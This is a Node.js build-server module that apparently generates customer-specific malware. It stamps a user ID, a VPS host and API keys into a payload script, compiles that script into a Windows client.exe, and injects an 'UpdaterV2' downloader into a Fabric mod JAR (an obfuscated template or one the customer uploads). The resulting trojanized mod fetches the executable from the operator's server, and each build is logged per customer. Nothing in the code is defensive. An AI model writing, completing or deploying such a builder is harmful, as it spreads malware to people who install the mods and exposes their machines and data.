const fs = require("fs-extra");
const path = require("path");
const { execFile, exec } = require("child_process");
const db = require("./db");

const BUILDS_DIR = path.resolve(__dirname, "..", "builds");
const BUILDER_DIR = path.resolve(__dirname, "..", "builder");
const PAYLOAD_DIR = path.resolve(__dirname, "..", "payload");
const SHARED_FILES_DIR = path.resolve(__dirname, "shared-files");

// Helper to run exec as a promise
function executeCommand(command, args = [], options = {}) {
  return new Promise((resolve, reject) => {
    if (args.length > 0) {
      execFile(command, args, options, (error, stdout, stderr) => {
        if (error) reject({ error, stderr });
        else resolve(stdout);
      });
    } else {
      exec(command, options, (error, stdout, stderr) => {
        if (error) reject({ error, stderr });
        else resolve(stdout);
      });
    }
  });
}

/**
 * Main build process triggers compilation and injection
 * @param {string|number} userId User triggering the build
 * @param {string} username Username of builder
 * @param {string} vpsHost Host address of the VPS (e.g. 'http://12.34.56.78:3000')
 * @returns {Promise<object>} Returns build details (paths, logs)
 */
async function startPersonalizedBuild(
  userId,
  username,
  vpsHost = "http://localhost:3000",
  customJarName = null,
) {
  const userBuildDir = path.join(BUILDS_DIR, `user_${userId}`);
  const tempDir = path.join(userBuildDir, "temp");
  const distDir = path.join(userBuildDir, "dist");

  // Ensure fresh folders
  await fs.ensureDir(userBuildDir);
  await fs.ensureDir(distDir);
  await fs.ensureDir(tempDir);

  const logDetails = {
    userId,
    timestamp: new Date().toISOString(),
    steps: [],
  };

  try {
    // Step 1: Generate custom payload file
    logDetails.steps.push("Step 1: Customizing payload/test.js template");
    const payloadTemplatePath = path.join(PAYLOAD_DIR, "test.js");
    if (!(await fs.pathExists(payloadTemplatePath))) {
      throw new Error(`Payload template not found at ${payloadTemplatePath}`);
    }

    let payloadContent = await fs.readFile(payloadTemplatePath, "utf8");

    // Inject build-time configuration. Secrets come from the server environment
    // (loaded from server/.env) and are baked into the compiled client only at
    // build time, never stored in the repository.
    const apiKey = process.env.API_KEY;
    const secretKey = process.env.SECRET_KEY;
    if (!apiKey || !secretKey) {
      throw new Error(
        "Build requires API_KEY and SECRET_KEY to be configured in server/.env",
      );
    }

    payloadContent = payloadContent
      .replace("PLACEHOLDER_USER_ID", String(userId))
      .replace("PLACEHOLDER_HOST_URL", vpsHost)
      .replace("PLACEHOLDER_API_KEY", apiKey)
      .replace("PLACEHOLDER_SECRET_KEY", secretKey);

    const tempPayloadPath = path.join(PAYLOAD_DIR, `test_user_${userId}.js`);
    await fs.writeFile(tempPayloadPath, payloadContent, "utf8");

    // Step 2: Compile payload using pkg
    logDetails.steps.push("Step 2: Compiling payload via @yao-pkg/pkg");
    const clientExePath = path.join(distDir, "client.exe");

    try {
      // Run pkg from PAYLOAD_DIR to resolve node_modules correctly
      const pkgCmd = `npx --yes @yao-pkg/pkg "${tempPayloadPath}" --targets node22-win-x64 --output "${clientExePath}"`;
      await executeCommand(pkgCmd, [], { cwd: PAYLOAD_DIR });
    } finally {
      // Clean up the temporary payload file
      await fs.remove(tempPayloadPath).catch(() => {});
    }

    // Step 3: Run the JAR builder
    logDetails.steps.push("Step 3: Compiling UpdaterV2 and Injecting into JAR");

    let targetJarPath = path.join(BUILDER_DIR, "fabric-obf.jar"); // Template target
    if (customJarName) {
      targetJarPath = path.join(SHARED_FILES_DIR, customJarName);
    }

    if (!(await fs.pathExists(targetJarPath))) {
      throw new Error(`Target JAR file not found at ${targetJarPath}`);
    }

    // hosted app link for the update check
    const hostedPayloadUrl = `${vpsHost}/api/payloads/download/${userId}/client.exe`;

    const builderIndex = path.join(BUILDER_DIR, "index.js");
    const builderArgs = [
      builderIndex,
      targetJarPath,
      String(userId), // Pass raw userId; builder will name jar injected_mod_user_{userId}.jar
      distDir,
      hostedPayloadUrl,
    ];

    // Execute jar builder index.js
    await executeCommand("node", builderArgs, {
      cwd: BUILDER_DIR,
      env: {
        ...process.env,
        INJECTOR_JAVA_RELEASE: "17", // Default release to compile UpdaterV2
      },
    });

    // Verify output exists — builder names: injected_mod_user_{userId}.jar
    const correctJarName = `injected_mod_user_${userId}.jar`;
    const correctJarPath = path.join(distDir, correctJarName);

    if (!(await fs.pathExists(correctJarPath))) {
      // Check for possible intermediate -injd-fabric-obf or -injd variant names based on target base name
      const targetBaseName = path.basename(targetJarPath, ".jar");
      const injdName = `${targetBaseName}-injd.jar`;
      const obfName = `${targetBaseName}-injd-${targetBaseName}.jar`;
      const altPath = path.join(distDir, injdName);
      const altObfPath = path.join(distDir, obfName);

      if (await fs.pathExists(altObfPath)) {
        await fs.move(altObfPath, correctJarPath, { overwrite: true });
      } else if (await fs.pathExists(altPath)) {
        await fs.move(altPath, correctJarPath, { overwrite: true });
      }
    }

    if (!(await fs.pathExists(correctJarPath))) {
      throw new Error(
        `Generated JAR not found at expected path: ${correctJarPath}`,
      );
    }

    // Clean temp dir
    // await fs.remove(tempDir);

    // Record build in DB
    const filesGenerated = [correctJarName, "client.exe"];
    const buildId = `build_user_${userId}_${Date.now()}`;
    await db.createBuild(userId, buildId, targetJarPath, filesGenerated);

    // Log action success
    await db.logAction(
      userId,
      username,
      "BUILD_GENERATE",
      {
        buildId,
        files: filesGenerated,
        updateUrl: hostedPayloadUrl,
      },
      "SUCCESS",
    );

    return {
      status: "SUCCESS",
      buildId,
      files: filesGenerated,
      jarPath: `/api/payloads/download/${userId}/${correctJarName}`,
      exePath: `/api/payloads/download/${userId}/client.exe`,
    };
  } catch (err) {
    console.error("Build failure:", err);
    const errMsg = err.stderr || err.message || JSON.stringify(err);

    // Log action failure
    await db.logAction(
      userId,
      username,
      "BUILD_GENERATE",
      {
        error: errMsg,
        steps: logDetails.steps,
      },
      "FAILED",
    );

    // Clean temp dir if possible
    try {
      // await fs.remove(tempDir);
    } catch (_) {}

    throw new Error(`Build system failed: ${errMsg}`);
  }
}

module.exports = {
  startPersonalizedBuild,
};
